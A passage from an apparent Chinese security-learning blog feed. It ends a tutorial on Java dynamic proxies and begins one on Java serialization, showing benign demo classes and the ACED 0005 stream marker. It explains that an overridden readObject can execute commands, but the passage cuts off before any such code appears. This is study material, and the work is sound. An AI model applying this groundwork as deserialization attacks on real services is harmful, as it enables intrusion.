title="实现"></a>实现</h3><p>具体的实现过程如下：</p><ol><li><p>自定义一个调用处理器类，该类需要继承自<code>java.lang.InvocationHandler</code>接口，由它来实现invoke方法，执行代理函数；</p></li><li><p>使用<code>java.lang.reflect.Proxy</code>类指定一个ClassLoader，一组interface接口和一个InvocationHandler；</p></li><li><p>通过反射机制获得动态代理类的构造方法，其唯一参数类型是调用处理器接口类型；</p></li><li><p>调用java.lang.reflect.Proxy.newProxyInstance()方法，分别传入类加载器，被代理接口，调用处理器；创建动态代理实例对象。</p></li><li><p>通过代理对象调用目标方法.</p></li></ol><p>我们还是以上面的经纪人和明星为例，其中，Star_impl接口和Star委托类不做任何修改。</p><p>我们先编写一个调用处理器类：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BrokerHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> {</span><br><span class="line">    <span class="keyword">private</span> Object target; <span class="comment">//被代理的对象</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BrokerHandler</span><span class="params">(Object target)</span> {</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 实现 java.lang.reflect.InvocationHandler.invoke()方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable{</span><br><span class="line">        <span class="keyword">if</span>(method.getName().equals(<span class="string">"sing"</span>)){ <span class="comment">//判断当前调用的哪个方法</span></span><br><span class="line">            System.out.println(<span class="string">"准备话筒"</span>); <span class="comment">// 添加自定义的委托逻辑</span></span><br><span class="line">        }<span class="keyword">else</span> <span class="keyword">if</span> (method.getName().equals(<span class="string">"dance"</span>)){</span><br><span class="line">            System.out.println(<span class="string">"准备舞台"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// 其他不需要代理的方法</span></span><br><span class="line">        <span class="keyword">return</span> method.invoke(target, args); <span class="comment">//利用反射机制，调用委托类的方法</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>修改main函数如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Star_impl subject, String song)</span>{</span><br><span class="line">        subject.sing(song);</span><br><span class="line">        System.out.println(subject.dance());</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">Star_impl</span> <span class="variable">star</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Star</span>(<span class="string">"一个不知名歌手"</span>); <span class="comment">//获取委托类的实例对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">song</span> <span class="operator">=</span> <span class="string">"一个不知名的歌曲"</span>;</span><br><span class="line">        System.out.println(<span class="string">"-----使用代理之前-----"</span>);</span><br><span class="line">        start(star, song);</span><br><span class="line">        System.out.println(<span class="string">"-----使用静态代理之后-----"</span>);</span><br><span class="line">        start(<span class="keyword">new</span> <span class="title class_">Broker</span>(star), song);</span><br><span class="line">        System.out.println(<span class="string">"-----使用动态代理之后-----"</span>);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> star.getClass().getClassLoader(); <span class="comment">// 通过委托类的实例对象获取相应的类加载器</span></span><br><span class="line">        Class[] interfaces = star.getClass().getInterfaces(); <span class="comment">//获取所有的接口</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BrokerHandler</span>(star); <span class="comment">//获取调用处理器</span></span><br><span class="line">        System.getProperties().put(<span class="string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span>,<span class="string">"true"</span>); <span class="comment">// 将jdk动态代理生成的类保存为.class文件，方便查看</span></span><br><span class="line">        <span class="type">Star_impl</span> <span class="variable">broker</span> <span class="operator">=</span> (Star_impl) Proxy.newProxyInstance(classLoader, interfaces, invocationHandler);</span><br><span class="line">        start(broker, song);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240120234754882.png" alt="结果2"></p><p>可以看到达到的效果和使用静态代理是差不多的。此外，可以看见我们生成的动态代理类的字节码文件，放置在程序根目录下的<code>com.sun.proxy.$Proxy0.class</code>文件中。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240120231258667.png" alt="com.sun.proxy.$Proxy0.class"></p><p>其源码如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.sun.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.Anchor.Star_impl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.UndeclaredThrowableException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">$Proxy0</span> <span class="keyword">extends</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">Star_impl</span> {</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m1;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m3;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m4;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m2;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m0;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $Proxy0(InvocationHandler var1) <span class="keyword">throws</span>  {</span><br><span class="line">        <span class="built_in">super</span>(var1);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object var1)</span> <span class="keyword">throws</span>  {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">return</span> (Boolean)<span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m1, <span class="keyword">new</span> <span class="title class_">Object</span>[]{var1});</span><br><span class="line">        } <span class="keyword">catch</span> (RuntimeException | Error var3) {</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        } <span class="keyword">catch</span> (Throwable var4) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var4);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">sing</span><span class="params">(String var1)</span> <span class="keyword">throws</span>  {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m3, <span class="keyword">new</span> <span class="title class_">Object</span>[]{var1});</span><br><span class="line">        } <span class="keyword">catch</span> (RuntimeException | Error var3) {</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        } <span class="keyword">catch</span> (Throwable var4) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var4);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">dance</span><span class="params">()</span> <span class="keyword">throws</span>  {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">return</span> (String)<span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m4, (Object[])<span class="literal">null</span>);</span><br><span class="line">        } <span class="keyword">catch</span> (RuntimeException | Error var2) {</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        } <span class="keyword">catch</span> (Throwable var3) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">toString</span><span class="params">()</span> <span class="keyword">throws</span>  {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">return</span> (String)<span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m2, (Object[])<span class="literal">null</span>);</span><br><span class="line">        } <span class="keyword">catch</span> (RuntimeException | Error var2) {</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        } <span class="keyword">catch</span> (Throwable var3) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> <span class="keyword">throws</span>  {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">return</span> (Integer)<span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m0, (Object[])<span class="literal">null</span>);</span><br><span class="line">        } <span class="keyword">catch</span> (RuntimeException | Error var2) {</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        } <span class="keyword">catch</span> (Throwable var3) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            m1 = Class.forName(<span class="string">"java.lang.Object"</span>).getMethod(<span class="string">"equals"</span>, Class.forName(<span class="string">"java.lang.Object"</span>));</span><br><span class="line">            m3 = Class.forName(<span class="string">"com.Anchor.Star_impl"</span>).getMethod(<span class="string">"sing"</span>, Class.forName(<span class="string">"java.lang.String"</span>));</span><br><span class="line">            m4 = Class.forName(<span class="string">"com.Anchor.Star_impl"</span>).getMethod(<span class="string">"dance"</span>);</span><br><span class="line">            m2 = Class.forName(<span class="string">"java.lang.Object"</span>).getMethod(<span class="string">"toString"</span>);</span><br><span class="line">            m0 = Class.forName(<span class="string">"java.lang.Object"</span>).getMethod(<span class="string">"hashCode"</span>);</span><br><span class="line">        } <span class="keyword">catch</span> (NoSuchMethodException var2) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodError</span>(var2.getMessage());</span><br><span class="line">        } <span class="keyword">catch</span> (ClassNotFoundException var3) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(var3.getMessage());</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>在这里生成的$Proxy0代理类中，我们可以清楚知道动态代理的实现过程。实际上我们在创建代理对象时，就是通过反射来获取这个类的构造方法，然后来创建的代理实例。</p><p>动态代理在很多框架中都用到了吗，比如spring,mybatis,以及我们在java安全中使用的ysoserial工具等，学习动态代理有助于看懂这些框架。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>关于java动态代理机制这块，网上的很多文章都是一笔带过，但是这一块内容又是java漏洞分析中不可缺少的一部分，在很多知识点中都会有所涉及，这篇文章就先系统了解java动态代理，为以后的学习做铺垫。</p><p><em><strong>参考文章：</strong></em></p><p><a href="https://xz.aliyun.com/t/9197?time__1311=n4+xuDgD9DyDnB7QGQD/D0WojdAKIb4TyW+D&amp;alichlgref=https://xz.aliyun.com/u/24696">JAVA安全基础（三）– java动态代理机制</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 0-1 javaSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关java反序列化</title>
      <link href="/2024/01/14/%E6%9C%89%E5%85%B3java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/01/14/%E6%9C%89%E5%85%B3java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>还是得先单独系统得学习学习java的反序列化的知识，不然研究很多东西还是会有些一头雾水。</p><h2 id="0x01-什么是java的序列化和反序列化？"><a href="#0x01-什么是java的序列化和反序列化？" class="headerlink" title="0x01 什么是java的序列化和反序列化？"></a>0x01 什么是java的序列化和反序列化？</h2><p>正如前面学习rmi时我所提到的，jvm虚拟机之间需要传递的内容是一个个java对象，而对象只是java里面的概念，而我们正常通信传输的形式只能是二进制数据，如何将java对象变为可以传输的字节流就是关于序列化的问题了。而反序列化，则是当传输的数据到达另一端后，如何把字节序列恢复java对象的过程。当然除了通信，序列化和反序列化也会被应用在对象的持久化存储中。</p><p><strong>一个对象要想序列化成功，需要同时满足下面两个条件：</strong></p><ol><li>该类必须实现 java.io.Serializable 接口。</li><li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</li></ol><blockquote><p>其中的”<strong>短暂</strong>“是指关键字 <code>transient</code>，它可以用来修饰类的成员变量（属性）。当一个属性被声明为 <code>transient</code> 时，该属性将被标记为短暂的，意味着在对象进行序列化时，该属性的值不会被持久化保存。这一点不是很重要，我们不必太过在意。</p><p>另外，如果你想知道一个 Java 标准类是否是可序列化的，可以通过查看该类的文档,查看该类有没有实现 java.io.Serializable接口。</p></blockquote><p>我们先来一个简单的示例，还是以前使用的User类,该类实现<code>java.io.Serializable类</code>：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">package com.Anchor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class User implements Serializable {</span><br><span class="line">    private String name;</span><br><span class="line">    private Integer age;</span><br><span class="line"></span><br><span class="line">    public User() {</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private User(String name) {</span><br><span class="line">        this.name = name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public User(String name, Integer age) {</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public String getName() {</span><br><span class="line">        return name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public void setName(String name) {</span><br><span class="line">        this.name = name;</span><br><span class="line">        System.out.println(this.getName());</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public Integer getAge() {</span><br><span class="line">        return age;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) {</span><br><span class="line">        this.age = age;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() {</span><br><span class="line">        return "User [name=" + name + ", age=" + age + "]";</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后来个<code>SerializeDemo</code>类将其序列化为二进制文件,首先要创建<code>OutputStream</code>对象，再将其封装在一个<code>ObjectOutputStream</code>对象内，接着只需调用<code>writeObject()</code>即可将对象序列化，并将其发送给<code>OutputStream</code>（对象是基于字节的，因此要使用<code>OutputStream</code>来继承层次结构）。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeDemo</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">"anch0r"</span>);</span><br><span class="line">        user.setAge(<span class="number">123</span>);</span><br><span class="line">        <span class="keyword">try</span>{</span><br><span class="line">            <span class="comment">//打开一个文件输入流 FIleOutputStream</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">"G:\\Desktop:\\user1.db"</span>);</span><br><span class="line">            <span class="comment">//建立对象输入流,将这个FIleOutputStream封装到ObjectOutputStream中</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line">            <span class="comment">//调用writeObject方法，序列化对象到文件user1.db中</span></span><br><span class="line">            out.writeObject(user);</span><br><span class="line">            out.close();</span><br><span class="line">            fileOut.close();</span><br><span class="line">            System.out.println(<span class="string">"Serialized data is saved successfully!"</span>);</span><br><span class="line">        }<span class="keyword">catch</span> (IOException i)</span><br><span class="line">        {</span><br><span class="line">            i.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>运行后，在相应路径下生成了一个user1.db的二进制文件，将其拖入到编辑器中查看内容：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240114164510661.png" alt="user1.db"></p><p>我们从最右边的字符显示中可以依稀看到该序列化数据的一些信息，比如全限定类名 com.Anchor.User、属性名以及对应的数据类型等等，但这些都不是重点，注意看我左上角框出的那串十六进制数字:<code>ACED 0005</code>, <code>ACED</code>是魔术数字(STREAM_MAGIC)，而<code>0005</code>是版本号，代表这里使用了序列化协议,从这里可以判断保存的内容是否为序列化数据。（这是在黑盒挖掘反序列化漏洞很重要的一个特征）</p><p>下面再编写个DeSerializeDemo将对象从字节序列中读到内存中，并打印相应的信息。对应地，这里首先要创建InputStream对象，再将其封装在一个ObjectInputStream对象内，接着只需调用readObject()即可将文件中的内容反序列化，要实例化一个user对象用来接收反序列化的结果。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeSerializeDemo</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>{</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">"G:\\Desktop\\user1.db"</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line">            user1 = (User) in.readObject();</span><br><span class="line">            in.close();</span><br><span class="line">            fileIn.close();</span><br><span class="line">        }<span class="keyword">catch</span>(IOException i)</span><br><span class="line">        {</span><br><span class="line">            i.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        }<span class="keyword">catch</span>(ClassNotFoundException c){</span><br><span class="line">            System.out.println(<span class="string">"User class not found"</span>);</span><br><span class="line">            c.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        System.out.println(<span class="string">"Deserilized User ……"</span>);</span><br><span class="line">        System.out.println(user1);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行结果如下，成功打印出了user1这个实例的信息：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240114171009865.png" alt="运行结果"></p><h2 id="0x02-漏洞产生"><a href="#0x02-漏洞产生" class="headerlink" title="0x02 漏洞产生"></a>0x02 漏洞产生</h2><p>   看完上面这个简单的序列化和反序列化demo以后，我们确实是掌握如何实现了，但是具体的漏洞点又是怎么产生的呢？对于php，我们知道，它的反序列化会触发一些魔术方法，比如<code>__wakeup</code>,<code>__destruct</code>等等，这些函数中如果有一些命令执行的危险操作，就可能导致漏洞产生。那么java反序列化是通过什么来触发漏洞的？我们可以看看上面这个<code>DeSerializeDemo</code>类，执行反序列化的核心方法就是这个<code>readObject()</code>,对于这个函数方法，它并不是写死在ObjectInputStream类中的，它是支持自定义改写的，包括前面的writeObject方法也是可以改写。所以只要readObject这个方法编写不当，就会造成反序列化漏洞，这就是为啥上一篇文章中我分析到<code>readObject</code>方法那边就说存在反序列化漏洞了。</p><p>   下面我们只需在User类中改写readObject方法，即可通过反序列化来执行一些命令：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span 